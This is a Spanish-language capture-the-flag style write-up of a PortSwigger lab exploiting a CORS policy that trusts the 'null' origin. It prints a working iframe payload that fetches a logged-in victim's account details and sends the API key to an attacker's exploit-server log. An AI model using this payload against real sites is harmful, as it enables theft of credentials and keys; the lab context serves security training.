---
title: "CORS vulnerability with trusted null origin"
description: "Laboratorio de Portswigger sobre CORS"
date: 2025-04-06 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - CORS
tags:
  - Portswigger Labs
  - CORS
  - CORS vulnerability with trusted null origin
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este sitio `web` tiene una configuración `Cross-Origin Resource Sharing (CORS)` insegura ya que confía en el origen `"null"`. Para `resolver` el `laboratorio`, debemos crear un `script en JavaScript` que utilice `Cross-Origin Resource Sharing (CORS)` para obtener la `clave API` del `administrador` y subir el `exploit` a nuestro `servidor de explotación`. El `laboratorio` se dará por `resuelto` cuando enviemos correctamente la `clave API del administrador`. Podemos `iniciar sesión` en nuestra cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/CORS-Lab-2/image_1.png)

Hacemos `click` sobre  `My account` y nos `logueamos` con las credenciales `wiener:peter`

![](/assets/img/CORS-Lab-2/image_2.png)

Vemos que podemos `cambiar` nuestro `email` y una clave `API`

![](/assets/img/CORS-Lab-2/image_3.png)

Si nos fijamos en la `petición` que se hace a `/accountDetails` cuando nos `logueamos`, veremos que el `servidor` nos `responde` con la cabecera `Access-Control-Allow-Credentials: true`. Esto `no lo hace vulnerable a CORS`, para que sea `vulnerable` tenemos que `ser capaces de controlar el origen de la petición`

![](/assets/img/CORS-Lab-2/image_4.png)

Para comprobar si podemos `manipular` el `origen` de la `petición` mandamos esta `petición` al `Repeater` y añadimos la cabecera `Origin: null`. Vemos que nos `responde` con la cabecera `Access-Control-Allow-Origin: null`

![](/assets/img/CORS-Lab-2/image_5.png)

`Modificamos` el `payload` anterior, nos `dirigimos` al `Exploit server` y lo `pegamos` 

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
  <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://0aa100af03ff4cc38027adf700490041.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
      location = 'https://exploit-0a2800d9039b4c5f8069ac7001ea0015.exploit-server.net/log?key=' + this.responseText;
    };
  </script>
"></iframe>
```

![](/assets/img/CORS-Lab-2/image_6.png)

Pulsamos sobre `View exploit` para `confirmar` que `funciona correctamente`

![](/assets/img/CORS-Lab-2/image_7.png)

Si pulsamos sobre `Access log` veremos que hemos `recibido` una `petición` con nuestra `credenciales`

![](/assets/img/CORS-Lab-2/image_8.png)

Una vez `comprobado` que `funciona`, `pulsamos` sobre `Deliver exploit to victim`

![](/assets/img/CORS-Lab-2/image_9.png)

`Copiamos` la `cadena recibida` en el `Decoder` de `Burpsuite` y la `URL decodeamos`

![](/assets/img/CORS-Lab-2/image_10.png)

Pulsamos en `Submit solution` y `añadimos` la `apiKey`

![](/assets/img/CORS-Lab-2/image_11.png)
